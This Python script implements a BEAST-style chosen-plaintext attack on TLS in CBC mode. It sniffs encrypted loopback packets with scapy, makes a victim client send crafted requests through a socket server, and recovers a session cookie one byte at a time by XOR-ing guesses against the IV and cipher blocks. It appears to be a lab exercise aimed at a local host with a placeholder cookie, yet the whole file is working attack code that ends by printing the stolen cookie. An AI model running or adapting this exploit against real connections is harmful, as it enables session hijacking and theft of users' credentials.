from socket import *
from scapy.all import sniff, Raw, TCP
import threading

BLOCK_SIZE = 16
STARTING_COOKIE_BLOCK = 16
COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK
host = "127.0.0.3"
file_path = "aaaaaaaaaaabfffffffffffffff"
#
stop_sniffing = False
captured_packet = None

condition = threading.Condition()
condition_met = False

'''
POST /aaaaaaaaaa
abffffffffffffff
f HTTP/1.1\r\nCont
ent-Type: text/p
lain\r\nUser-Agent
: Mozilla/4.0 (W
indows NT (unkno
wn) 6.2) Java/1.
7.0\r\nHost: 127.0
.0.3\r\nAccept: te
xt/html, image/g
if, image/jpeg, 
*; q=.2, */*; q=
.2\r\nConnection: 
keep-alive\r\nCont
ent-Length: 16\r\n
Cookie: SessionI
D=SecretValue\r\n\r
\n
'''

# Function to sniff packets
def sniff_packets():
    global stop_sniffing, captured_packet,condition_met

    def packet_callback(packet):
        global captured_packet, stop_sniffing,condition_met
        if TCP in packet and (packet[TCP].dport == 443):
            if Raw in packet:
                raw_data = packet[Raw].load
                # Check if the first byte of the Raw layer is 0x17 (TLS Application Data)
                if raw_data and raw_data[0] == 0x17:
                    with condition:
                        #print("Sniffer found 0x17 packet!")
                        captured_packet = raw_data
                        condition_met = True
                        condition.notify()

    def stop_filter(packet):
        return stop_sniffing

    # Start sniffing packets in the background
    sniff(iface='\\Device\\NPF_Loopback', filter='tcp', prn=packet_callback, stop_filter=stop_filter)
###

def init_server_socket(port):
    server = socket(AF_INET, SOCK_STREAM) # (IPV4, TCP) socket object 
    server.bind((host, port))
    server.listen(1)
    return server

def block_xor(b1, b2, b3):
    s = b''
    for c1, c2, c3 in zip(b1, b2, b3):
      s += bytes([c1 ^ c2 ^ c3])
    return s

def request_func(step):
    """
      Construct the current file_path
    """
    ans = file_path if step%BLOCK_SIZE == 0 else file_path[:-(step%BLOCK_SIZE)]
    return ans

def main(sock):
    global stop_sniffing, captured_packet,condition_met
    global file_path , COOKIE_BLOCK_NUM, STARTING_COOKIE_BLOCK, BLOCK_SIZE
    curr_file_path = file_path
    iv = None
    i_know = b'Cookie: Session'
    attacker_cookie = b''
    cipher = None

    while attacker_cookie[-4:] != b'\r\n\r\n':
        print("Attacker_cookie = ",end="")
        print(attacker_cookie)
        for i in range(256):
            #print(f"{i} Iteration")
            #make the victim send the encrypted cookie
            sock.sendall(curr_file_path.encode() + b'\n') #followed by a newline character to match victim's `readLine()`
            with condition:
                while not condition_met: #or int.from_bytes(captured_packet[3:5], 'big')<49:
                    condition.wait()
                cipher = captured_packet[5:]
                condition_met = False
            
            #print(f"Captured packet: {captured_packet}")
            iv = cipher[-BLOCK_SIZE:]
            cookie_cipher = cipher[COOKIE_BLOCK_NUM*BLOCK_SIZE:(COOKIE_BLOCK_NUM+1)*BLOCK_SIZE]
            prev_cipher = cipher[(COOKIE_BLOCK_NUM-1)*BLOCK_SIZE:COOKIE_BLOCK_NUM*BLOCK_SIZE]

            guess = i_know+bytes([i])
            guess = block_xor(guess,iv,prev_cipher)
            sock.sendall(guess)

            with condition:
                while not condition_met: #or int.from_bytes(captured_packet[3:5], 'big')>=49:
                    condition.wait()
                cipher = captured_packet[5:]    
                condition_met = False

            if cipher[:BLOCK_SIZE] == cookie_cipher:
                attacker_cookie += bytes([i])
                i_know = i_know[1:]+bytes([i])
                break

        curr_file_path = request_func(len(attacker_cookie))

        COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK+len(attacker_cookie)//BLOCK_SIZE
    
    stop_sniffing = True
    print("I AM THE ATTACKER.\nTHE VICTIM'S COOKIE IS", attacker_cookie)


if __name__ == '__main__':
    sniff_thread = threading.Thread(target=sniff_packets)
    sniff_thread.start()

    
    server = init_server_socket(port=1337)
    connection, victim_address = server.accept()
    main(connection)

    connection.close()
    server.close()

    sniff_thread.join()

    #sniff_thread = threading.Thread(target=sniff_packets, daemon=True)